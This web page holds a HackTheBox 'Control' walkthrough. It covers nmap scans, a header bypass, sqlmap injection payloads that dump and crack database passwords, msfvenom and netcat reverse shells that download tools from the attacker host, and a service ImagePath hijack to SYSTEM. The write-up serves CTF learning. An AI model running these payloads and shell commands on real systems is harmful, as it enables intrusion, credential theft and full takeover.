<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Control | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,windows,hard"><meta name=description content="Control HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/control/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/control/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Control "><meta property="og:description" content="Control HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/control/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/control/control.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-04-25T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/control/control.png"><meta name=twitter:title content="Control "><meta name=twitter:description content="Control HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Control ","item":"https://s4ch.github.io/writeups/hackthebox/control/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Control ","name":"Control ","description":"Control HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","windows","hard"],"articleBody":"≡ƒÆó Info Name: Control Profile: www.hackthebox.eu Difficulty: Hard OS: Windows Points: 40 Overview Network Enumeration: nmap, port 80, 3306 Webapp Enumeration: admin.php, X-Forwarded-For Webapp Exploitation: search products SQLi: dump creds + cmd exec Privilege Escalation : isur to hector: powershell runas Privilege Escalation : hector to system: bin path SYSTEM service exploit Network Enumeration TL;DR: nmap, port 80, 3306\nA quick nmap scan to see which ports are open nmap -sS -p- -oA nmap_full 10.10.10.167:\n# Nmap 7.80 scan initiated Fri Mar 20 23:53:43 2020 as: nmap -sS -p- -oA nmap_full 10.10.10.167 Nmap scan report for 10.10.10.167 Host is up (0.031s latency). Not shown: 65531 filtered ports PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 3306/tcp open mysql 49666/tcp open unknown # Nmap done at Fri Mar 20 23:57:58 2020 -- 1 IP address (1 host up) scanned in 254.87 seconds And a second nmap scan to discover services and versions nmap -sSVC -p 80,135,3306,49666 10.10.10.167:\nPORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 3306/tcp open mysql? | fingerprint-strings: | NULL, oracle-tns: |_ Host '10.10.15.52' is not allowed to connect to this MariaDB server 49667/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.80%I=7%D=3/20%Time=5E7548B5%P=x86_64-pc-linux-gnu%r(NU SF:LL,4A,\"F\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.15\\.52'\\x20is\\x20not\\x20allow SF:ed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(oracle-tns,4 SF:A,\"F\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.15\\.52'\\x20is\\x20not\\x20allowed\\x SF:20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\"); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows The SQL server gives us a connection refused so we’ll go with the HTTP server.\nWebapp Enumeration TL;DR: admin.php, X-Forwarded-For\nOptionally you can run a web discovery tool like dirsearch even if not needed here.\nTarget: 10.10.10.167 [23:56:22] Starting: [23:56:22] 403 - 312B - /%2e%2e/google.com [23:56:28] 200 - 8KB - /about.php [23:56:30] 200 - 89B - /admin.php [23:56:30] 200 - 89B - /Admin.php [23:56:35] 301 - 150B - /assets -\u003e http://10.10.10.167/assets/ [23:56:40] 200 - 0B - /database.php [23:56:44] 301 - 150B - /images -\u003e http://10.10.10.167/images/ [23:56:44] 301 - 150B - /Images -\u003e http://10.10.10.167/Images/ [23:56:44] 200 - 3KB - /index.php [23:56:44] 200 - 3KB - /INDEX.PHP [23:56:44] 200 - 3KB - /index.php/login/ [23:56:44] 200 - 3KB - /index.PHP [23:56:45] 200 - 17KB - /license.txt [23:56:45] 200 - 17KB - /LICENSE.txt [23:56:45] 200 - 17KB - /License.txt [23:56:57] 301 - 151B - /uploads -\u003e http://10.10.10.167/uploads/ [23:56:57] 403 - 1KB - /uploads/ If we take a look at the source of index.php we can see the following comment:\nVery interesting comment that will help us in the near future.\nNot let’s try to reach the admin.php page:\n$ curl http://10.10.10.167/admin.php Access Denied: Header Missing. Please ensure you go through the proxy to access this page We are denied but we are supposed to go through a proxy, so let’s add a X-Forwarded-For HTTP header and using an internal address we saw the a comment before 192.168.4.28.\n$ curl http://10.10.10.167/admin.php -H 'X-Forwarded-For: 192.168.4.28' It works we can access the page but we can do that in burp in a persistent way so we can browse the app in our web browser rather than with curl.\nSo now we can see this.\nWebapp Exploitation TL;DR: search products SQLi: dump creds + cmd exec\nThere was a comment Import Products and also a SQL database from the nmap scan so we can try a SQL injection (SQLi).\nI used sqlmap (not forgetting to add the X-Forwarded-For header) to exploit the SQLi.\nFirst, let’s list tables:\n$ sqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data 'productName=toto' --tables -H 'X-Forwarded-For: 192.168.4.28' [00:29:49] [INFO] fetching tables for databases: 'information_schema, mysql, warehouse' Database: information_schema [77 tables] ... Database: mysql [31 tables] +---------------------------------------+ | user | | column_stats | | columns_priv | | db | | event | | func | | general_log | | global_priv | | gtid_slave_pos | | help_category | | help_keyword | | help_relation | | help_topic | | index_stats | | innodb_index_stats | | innodb_table_stats | | plugin | | proc | | procs_priv | | proxies_priv | | roles_mapping | | servers | | slow_log | | table_stats | | tables_priv | | time_zone | | time_zone_leap_second | | time_zone_name | | time_zone_transition | | time_zone_transition_type | | transaction_registry | +---------------------------------------+ Database: warehouse [3 tables] +---------------------------------------+ | product | | product_category | | product_pack | +---------------------------------------+ We can dump users credentials stored in table user from database mysql.\n$ sqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data 'productName=toto' -H 'X-Forwarded-For: 192.168.4.28' -D mysql -T user --dump -C User,Password +---------+-------------------------------------------+ | User | Password | +---------+-------------------------------------------+ | hector | *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D | | manager | *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA | | root | *0A4A5CAD344718DC418035A1F4D292BA603134D8 | | root | *0A4A5CAD344718DC418035A1F4D292BA603134D8 | | root | *0A4A5CAD344718DC418035A1F4D292BA603134D8 | | root | *0A4A5CAD344718DC418035A1F4D292BA603134D8 | +---------+-------------------------------------------+ Great, sqlmap was able to crack 2 hashes with it’s embedded automatic bruteforce:\nmanager / l3tm3!n hector / l33th4x0rhector For your information here are the various methods sqlmap was able to exploit:\nParameter: productName (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) Payload: productName=-7611' OR 8249=8249# Type: error-based Title: MySQL \u003e= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: productName=toto' AND (SELECT 1413 FROM(SELECT COUNT(*),CONCAT(0x7178717671,(SELECT (ELT(1413=1413,1))),0x7176786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dkpS Type: stacked queries Title: MySQL \u003e= 5.0.12 stacked queries (comment) Payload: productName=toto';SELECT SLEEP(5)# Type: time-based blind Title: MySQL \u003e= 5.0.12 AND time-based blind (query SLEEP) Payload: productName=toto' AND (SELECT 7102 FROM (SELECT(SLEEP(5)))ETMY)-- bIbM Type: UNION query Title: MySQL UNION query (NULL) - 6 columns Payload: productName=toto' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7178717671,0x5665716b58786a4955776773767048694661436950414263626c756b56717243616f6d59796b4f66,0x7176786a71),NULL# In order to avoid time-based queries we can use the --technique BEUS option.\nsqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data 'productName=toto' -H 'X-Forwarded-For: 192.168.4.28' --os-pwn --dbms mysql --tmp-path 'C:/Windows/Temp/' --random-agent --priv-esc --web-root 'C:/Inetpub/wwwroot/' --technique BEUS I tried to get a reverse shell with --os-pwn directly but something when wrong so let’s try a more manual approach.\nLet’s use --sql-shell to be able to run some SQL queries.\n$ sqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data 'productName=toto' -H 'X-Forwarded-For: 192.168.4.28' --dbms mysql --sql-shell select load_file('C:/WINDOWS/system32/drivers/etc/hosts'): '# Copyright (c) 1993-2009 Microsoft Corp.\\r\\n#\\r\\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\\r\\n#\\r\\n# This file contains the mappings of IP addresses to host names. Each\\r\\n# entry should be kept on an individual line. The IP address should\\r\\n# be placed in the first column followed by the corresponding host name.\\r\\n# The IP address and the host name should be separated by at least one\\r\\n# space.\\r\\n#\\r\\n# Additionally, comments (such as these) may be inserted on individual\\r\\n# lines or following the machine name denoted by a '#' symbol.\\r\\n#\\r\\n# For example:\\r\\n#\\r\\n# 102.54.94.97 rhino.acme.com # source server\\r\\n# 38.25.63.10 x.acme.com # x client host\\r\\n\\r\\n# localhost name resolution is handled within DNS itself.\\r\\n#\\t127.0.0.1 localhost\\r\\n#\\t::1 localhost\\r\\n' With select load_file('C:/WINDOWS/system32/drivers/etc/hosts') it try to see if we can read files and it’s working!\n[17:26:33] [INFO] fetching SQL SELECT statement query output: 'select user()' select user(): 'manager@localhost' The current user is manager.\n[17:35:28] [INFO] fetching SQL SELECT statement query output: 'select version()' select version(): '10.4.8-MariaDB' The MySQL implementation is MariaDB.\nLet’s check the users’ privileges.\n$ sqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data 'productName=toto' -H 'X-Forwarded-For: 192.168.4.28' --dbms mysql --privileges [17:52:11] [INFO] fetching database users privileges database management system users privileges: [*] 'hector'@'localhost' (administrator) [29]: privilege: ALTER privilege: ALTER ROUTINE privilege: CREATE privilege: CREATE ROUTINE privilege: CREATE TABLESPACE privilege: CREATE TEMPORARY TABLES privilege: CREATE USER privilege: CREATE VIEW privilege: DELETE privilege: DELETE HISTORY privilege: DROP privilege: EVENT privilege: EXECUTE privilege: FILE privilege: INDEX privilege: INSERT privilege: LOCK TABLES privilege: PROCESS privilege: REFERENCES privilege: RELOAD privilege: REPLICATION CLIENT privilege: REPLICATION SLAVE privilege: SELECT privilege: SHOW DATABASES privilege: SHOW VIEW privilege: SHUTDOWN privilege: SUPER privilege: TRIGGER privilege: UPDATE [*] 'manager'@'localhost' [1]: privilege: FILE [*] 'root'@'127.0.0.1' (administrator) [29]: privilege: ALTER privilege: ALTER ROUTINE privilege: CREATE privilege: CREATE ROUTINE privilege: CREATE TABLESPACE privilege: CREATE TEMPORARY TABLES privilege: CREATE USER privilege: CREATE VIEW privilege: DELETE privilege: DELETE HISTORY privilege: DROP privilege: EVENT privilege: EXECUTE privilege: FILE privilege: INDEX privilege: INSERT privilege: LOCK TABLES privilege: PROCESS privilege: REFERENCES privilege: RELOAD privilege: REPLICATION CLIENT privilege: REPLICATION SLAVE privilege: SELECT privilege: SHOW DATABASES privilege: SHOW VIEW privilege: SHUTDOWN privilege: SUPER privilege: TRIGGER privilege: UPDATE It seems our current user manager is less privileged than root or hector but still has the FILE perm that allowed use to read C:/WINDOWS/system32/drivers/etc/hosts.\nAs I said earlier --os-pwn was not working so I tried --os-shell to run some command manually.\nI generated (locally) a meterpreter reverse shell.\n$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=9999 -f exe \u003e win.exe And tried to upload it will powershell in the os-shell session.\nos-shell\u003e powershell -nop -c \"wget http://10.10.14.34:8080/win.exe -OutFile uploads\\win.exe\" Unfortunately, there is an EDR blocking and removing our reverse shell.\n'The system cannot execute the specified program.' I persisted and tried with various encoders or without meterpreter.\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=8080 -f exe -e shikata_ga_nai -i 3 \u003e win.exe -\u003e spotted msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=8080 -f exe -e shikata_ga_nai -i 4100 \u003e win.exe -\u003e spotted msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.34 LPORT=8080 -f exe \u003e win.exe -\u003e spotted I found a manual obfuscation method with raw python that claimed to work 100% of the time but it was overkill and too time consuming to do AV evasion.\nElse is tried to upload nc.exe:\ncp ~/CTF/tools/kali-windows-binaries/nc.exe . Note: the pre-compiled binary can be found here: interference-security/kali-windows-binaries.\nSo I uploaded it and created a powershell session:\nos-shell\u003e powershell -nop -c \"wget http://10.10.15.123:8080/nc.exe -OutFile uploads\\nc.exe\" os-shell\u003e uploads\\nc.exe 10.10.15.123 9999 -e powershell.exe Yey, the listener caught it without being spotted by the EDR:\n$ nc -nlp 9999 Microsoft Windows [Version 10.0.17763.805] (c) 2018 Microsoft Corporation. All rights reserved. C:\\inetpub\\wwwroot\u003ewhoami nt authority\\iusr C:\\inetpub\\wwwroot\u003e Ok so we are logged as nt authority\\iusr, a service account.\nPrivilege Escalation : isur to hector TL;DR: powershell runas\nSo we may need to log as hector or manager to see interesting stuff.\nBut runas tricks like this one never works outside a true graphical terminal.\ncmd /C echo l33th4x0rhector | runas /user:hector /netonly cmd.exe So I had to figure out how to do it in powershell.\nBefore let’s check detailed permissions:\nC:\\inetpub\\wwwroot\u003ewhoami /all whoami /all USER INFORMATION ---------------- User Name SID ================= ======== nt authority\\iusr S-1-5-17 GROUP INFORMATION ----------------- Group Name Type SID Attributes ==================================== ================ ============ ================================================== Mandatory Label\\High Mandatory Level Label S-1-16-12288 Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\IIS_IUSRS Alias S-1-5-32-568 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\SERVICE Well-known group S-1-5-6 Group used for deny only CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ======================= ========================================= ======= SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled ERROR: Unable to get user claims information. I found the following tricks on Hack Tricks, on this page:\n# create a credential object $pass = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential('CONTROL\\Hector', $pass) # check if credentials are working executing Invoke-Command -Computer Fidelity -ScriptBlock { whoami } -Credential $cred # Now the real command Invoke-Command -Computer Fidelity -Credential $cred -ScriptBlock { cmd /c \"C:\\inetpub\\wwwroot\\uploads\\nc.exe -e powershell 10.10.15.123 10000\" } I lost hours at this step. Why?\nBecause of troll from the challenge author.\nThe Invoke-Command command requires the right hostname to work even if it is localhost else it fails with an obscure error.\nWhen you get the hostname of the machine in a classic way, or with enumeration tool or if you guess that the name of the HTB box, you will think that the hostname is CONTROL right?\nPS C:\\inetpub\\wwwroot\u003e gc env:computername CONTROL PS C:\\inetpub\\wwwroot\u003e $env:computername CONTROL c:\\\u003eecho %computername% CONTROL Not at all, I don’t understand why but the legacy Hostname.exe returns Fidelity, same in powershell..\nPS C:\\inetpub\\wwwroot\u003e Hostname.exe Fidelity PS C:\\inetpub\\wwwroot\u003e [System.Net.Dns]::GetHostName() Fidelity So here I learned that the hostname (DNS) != hostname (computer name). Most of the time this will be the same, but here it was not.\nFor professional and attentive guesser, Fidelity was written on the home page of the webapp.\nNow that our powershell runas works we can grab the user flag.\n$ nc -nlp 10000 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\Hector\\Documents\u003e whoami control\\hector PS C:\\Users\\Hector\u003e gc Desktop\\user.txt d8782dd01fb15b72c4b5ba77ef2d472b Privilege Escalation : hector to system TL;DR: bin path SYSTEM service exploit\nWe can see if hector has a command history.\nPS C:\\Users\\Hector\u003e Get-Content C:\\Users\\Hector\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt get-childitem HKLM:\\SYSTEM\\CurrentControlset | format-list get-acl HKLM:\\SYSTEM\\CurrentControlSet | format-list Fine, it seems to be a clue, we must have to look at services.\nPS C:\\Users\\Hector\u003e get-acl HKLM:\\System\\CurrentControlSet\\services\\* | Format-List * | findstr /i \"Hector Users Path Everyone\" There are dozens services where hector has full control, let’s find one that iusr can restart.\nLet’s try with a sysinternal tool.\n$ cp /usr/share/windows/sysinternals-suite/accesschk64.exe . PS C:\\Users\\Hector\\Videos\u003e powershell -nop -c \"wget http://10.10.15.123:8080/accesschk64.exe -OutFile cyfun.exe\" .\\cyfun.exe -uwcqv Hector * /accepteula But access denied because it tries to open Service Control Manager.\nGet all services:\nPS C:\\Users\\Hector\\Videos\u003e reg query hklm\\system\\currentcontrolset\\services \u003e cyfun.txt PS C:\\Users\\Hector\\Videos\u003e copy cyfun.txt C:\\inetpub\\wwwroot\\uploads\\cyfun.txt $ cat services_fullpath.txt| cut -d '\\' -f 5 \u003e services.txt Get services owners and who can modify them.\nPS C:\\Users\\Hector\\Videos\u003e get-acl HKLM:\\System\\CurrentControlSet\\services\\* | Format-List PSChildName,Owner,Group,AccessToString | Out-String -Width 300 \u003e cyfun.txt PS C:\\Users\\Hector\\Videos\u003e copy cyfun.txt C:\\inetpub\\wwwroot\\uploads\\cyfun.txt Get services registry binary path\nPS C:\\Users\\Hector\\Videos\u003e reg query hklm\\System\\CurrentControlSet\\Services /s /v imagepath powershell -nop -c \"wget http://10.10.15.123:8080/services_name.txt -OutFile services_name.txt\" In cmd.exe we can try to loop over all services like that:\nFOR /F %i in (services_name.txt) DO @sc qc %i I translated this in PowerShell to check process that the user has access to:\nforeach($line in Get-Content .\\services_name.txt) { $res = iex \"sc.exe qc $line\" if($res -match 'QueryServiceConfig SUCCESS'){ echo $res } } So we have a list of services that Hector can modify, that iusr can restart and that are own and executed as SYSTEM.\nWith Hector we try to modify wuauserv binary to a reverse shell command:\nC:\\Users\\Hector\\Videos\u003ereg add HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\wuauserv /v ImagePath /t REG_EXPAND_SZ /d \"C:\\Inetpub\\wwwroot\\uploads\\nc.exe 10.10.15.123 10004 -e powershell.exe\" /f The operation completed successfully. With iusr we start the service: sc start wuauserv so we gain a system shell.\nnc -nlp 10004 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u003e gc C:\\Users\\Administrator\\Desktop\\root.txt 8f8613f5b4da391f36ef11def4cec1b1 PS C:\\Windows\\system32\u003e whoami nt authority\\system Note: the command is executed even if sc displays an error.\nWhy wuauserv? I just tried them all and it worked with this one.\nFiles As the output of the commands listing services were very long I pasted them in a Gist.\nGist\nservices_bin_path.txt services_fullpath.txt services_name.txt services_name2.txt services_rights.txt services_that_can_be_restarted.txt ","wordCount":"2474","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/control/control.png","datePublished":"2020-04-25T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/control/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Control</h1><div class=post-description>Control HackTheBox writeup</div><div class=post-meta>&lt;span title='2020-04-25 00:00:00 +0000 UTC'>April 25, 2020&lt;/span>&amp;nbsp;·&amp;nbsp;12 min&amp;nbsp;·&amp;nbsp;2474 words&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/tags/ctf/" class="post-tag" title="ctf">ctf&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/hackthebox/" class="post-tag" title="hackthebox">hackthebox&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/penetration-testing/" class="post-tag" title="penetration-testing">penetration-testing&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/writeup/" class="post-tag" title="writeup">writeup&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/windows/" class="post-tag" title="windows">windows&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/hard/" class="post-tag" title="hard">hard&lt;/a>
&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/categories/writeups/" class="post-tag" title="writeups">writeups&lt;/a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/control/control.png alt="Control HackTheBox Machine"><p>Control - Hard Windows Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network Enumeration</a></li><li><a href=#webapp-enumeration>Webapp Enumeration</a></li><li><a href=#webapp-exploitation>Webapp Exploitation</a></li><li><a href=#privilege-escalation--isur-to-hector>Privilege Escalation : isur to hector</a></li><li><a href=#privilege-escalation--hector-to-system>Privilege Escalation : hector to system</a></li><li><a href=#files>Files</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><ul><li><strong>Name:</strong> Control</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/218>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Hard</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 40</li></ul><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><ul><li><strong>Network Enumeration</strong>: nmap, port 80, 3306</li><li><strong>Webapp Enumeration</strong>: <code>admin.php</code>, <code>X-Forwarded-For</code></li><li><strong>Webapp Exploitation</strong>: search products SQLi: dump creds + cmd exec</li><li><strong>Privilege Escalation : isur to hector</strong>: powershell <em>runas</em></li><li><strong>Privilege Escalation : hector to system</strong>: bin path SYSTEM service exploit</li></ul><h3 id=network-enumeration>Network Enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p><strong>TL;DR</strong>: nmap, port 80, 3306</p><p>A quick <a href=https://nmap.org/>nmap</a> scan to see which ports are open
<code>nmap -sS -p- -oA nmap_full 10.10.10.167</code>:</p><pre tabindex=0><code># Nmap 7.80 scan initiated Fri Mar 20 23:53:43 2020 as: nmap -sS -p- -oA nmap_full 10.10.10.167
Nmap scan report for 10.10.10.167
Host is up (0.031s latency).
Not shown: 65531 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
3306/tcp  open  mysql
49666/tcp open  unknown

# Nmap done at Fri Mar 20 23:57:58 2020 -- 1 IP address (1 host up) scanned in 254.87 seconds
</code></pre><p>And a second <a href=https://nmap.org/>nmap</a> scan to discover services and versions
<code>nmap -sSVC -p 80,135,3306,49666 10.10.10.167</code>:</p><pre tabindex=0><code>PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql?
| fingerprint-strings:
|   NULL, oracle-tns:
|_    Host &#39;10.10.15.52&#39; is not allowed to connect to this MariaDB server
49667/tcp open  msrpc   Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=3/20%Time=5E7548B5%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4A,&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.15\.52&#39;\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;)%r(oracle-tns,4
SF:A,&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.15\.52&#39;\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;);
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre><p>The SQL server gives us a connection refused so we&rsquo;ll go with the HTTP server.</p><h3 id=webapp-enumeration>Webapp Enumeration<a hidden class=anchor aria-hidden=true href=#webapp-enumeration>#</a></h3><p><strong>TL;DR</strong>: <code>admin.php</code>, <code>X-Forwarded-For</code></p><p>Optionally you can run a web discovery tool like <a href=https://github.com/maurosoria/dirsearch>dirsearch</a> even
if not needed here.</p><pre tabindex=0><code>Target: 10.10.10.167

[23:56:22] Starting:
[23:56:22] 403 -  312B  - /%2e%2e/google.com
[23:56:28] 200 -    8KB - /about.php
[23:56:30] 200 -   89B  - /admin.php
[23:56:30] 200 -   89B  - /Admin.php
[23:56:35] 301 -  150B  - /assets  -&gt;  http://10.10.10.167/assets/
[23:56:40] 200 -    0B  - /database.php
[23:56:44] 301 -  150B  - /images  -&gt;  http://10.10.10.167/images/
[23:56:44] 301 -  150B  - /Images  -&gt;  http://10.10.10.167/Images/
[23:56:44] 200 -    3KB - /index.php
[23:56:44] 200 -    3KB - /INDEX.PHP
[23:56:44] 200 -    3KB - /index.php/login/
[23:56:44] 200 -    3KB - /index.PHP
